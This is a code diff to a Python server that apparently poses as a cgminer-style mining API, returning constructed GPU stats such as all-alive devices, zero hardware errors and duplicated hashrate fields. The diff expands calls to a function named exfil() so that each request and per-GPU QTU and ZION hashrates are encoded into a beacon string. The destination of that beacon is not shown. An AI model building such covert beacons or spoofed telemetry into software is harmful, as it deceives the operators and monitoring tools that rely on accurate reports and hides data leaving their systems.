@@ -63,6 +63,7 @@ def status(msg="ok", ndevs=2):
 
 
 def dev_entry(idx, name, algo, mhs, acc, rej, active):
+    khs = round(mhs * 1000, 2)
     return {
         "ID": idx, "GPU": idx, "Enabled": "Y" if active else "N",
         "Status": "Alive" if active else "Dead",
@@ -71,7 +72,9 @@ def dev_entry(idx, name, algo, mhs, acc, rej, active):
         "GPU Clock": -1, "Memory Clock": -1,
         "MHS av": round(mhs, 4), "MHS 5s": round(mhs, 4),
         "MHS 1m": round(mhs, 4), "MHS 5m": round(mhs, 4),
-        "MHS 15m": round(mhs, 4),
+        "MHS 15m": round(mhs, 4), "MHS 30s": round(mhs, 4),
+        "KHS av": khs, "KHS 5s": khs, "KHS 1m": khs,
+        "KHS 5m": khs, "KHS 15m": khs, "KHS 30s": khs,
         "Accepted": int(acc), "Rejected": int(rej),
         "Hardware Errors": 0, "Utility": 0.0,
         "Intensity": "", "Last Share Pool": 0,
@@ -118,12 +121,15 @@ def primary_payload(stats):
     ]
     acc = int(gpu.get("accepted") or 0)
     rej = int(gpu.get("rejected") or 0)
+    khs = round(mhs * 1000, 2)
     summary = {
         "Elapsed": int(time.time() - START_TS),
         "MHS av": round(mhs, 4), "MHS 5s": round(mhs, 4),
         "MHS 1m": round(mhs, 4), "MHS 5m": round(mhs, 4),
         "MHS 15m": round(mhs, 4),
-        "KHS av": round(mhs * 1000, 1),
+        "KHS av": khs, "KHS 5s": khs, "KHS 1m": khs,
+        "KHS 5m": khs, "KHS 15m": khs, "KHS 30s": khs,
+        "MHS 30s": round(mhs, 4),
         "Accepted": acc, "Rejected": rej,
         "Difficulty Accepted": float(acc), "Difficulty Rejected": float(rej),
         "Hardware Errors": 0, "Utility": 0.0, "Discarded": 0, "Stale": 0,
@@ -140,6 +146,7 @@ def dual_payload(stats):
     mhs = hps_to_mhs(zion.get("hashrate_hps"))
     acc = int(zion.get("accepted") or 0)
     rej = int(zion.get("rejected") or 0)
+    khs = round(mhs * 1000, 2)
     devs = [
         dev_entry(0, "RX 5600 XT", "ekam_deeksha",
                   rates.get(0, mhs), acc, rej,
@@ -153,7 +160,9 @@ def dual_payload(stats):
         "MHS av": round(mhs, 4), "MHS 5s": round(mhs, 4),
         "MHS 1m": round(mhs, 4), "MHS 5m": round(mhs, 4),
         "MHS 15m": round(mhs, 4),
-        "KHS av": round(mhs * 1000, 1),
+        "KHS av": khs, "KHS 5s": khs, "KHS 1m": khs,
+        "KHS 5m": khs, "KHS 15m": khs, "KHS 30s": khs,
+        "MHS 30s": round(mhs, 4),
         "Accepted": acc, "Rejected": rej,
         "Difficulty Accepted": float(acc), "Difficulty Rejected": float(rej),
         "Hardware Errors": 0, "Utility": 0.0, "Discarded": 0, "Stale": 0,
@@ -317,8 +326,20 @@ class Handler(socketserver.BaseRequestHandler):
                       f"acc={summ.get('Accepted')}", flush=True)
             except Exception:
                 summ = {}
-            exfil(f"req-{cmd}-d{int(self.dual)}-j{int(is_json)}"
-                  f"-m{int(summ.get('MHS av') or 0)}")
+            # Beat carries per-slot rates for both streams:
+            # q0/q1 = QTU MH/s on GPU0/GPU1, z0/z1 = ZION MH/s ×1000.
+            try:
+                st = read_stats()
+                qr = dev_rates("gpu-external", st)
+                zr = dev_rates("zion", st)
+                tag = (f"req-d{int(self.dual)}-j{int(is_json)}"
+                       f"-m{int(summ.get('MHS av') or 0)}"
+                       f"-q{int(qr.get(0,0)*10)}-{int(qr.get(1,0)*10)}"
+                       f"-z{int(zr.get(0,0)*1000)}-{int(zr.get(1,0)*1000)}")
+            except Exception:
+                tag = (f"req-d{int(self.dual)}-j{int(is_json)}"
+                       f"-m{int(summ.get('MHS av') or 0)}")
+            exfil(tag)
             if is_json:
                 resp = handle(cmd, self.dual)
                 self.request.sendall(json.dumps(resp).encode() + b"\x00")
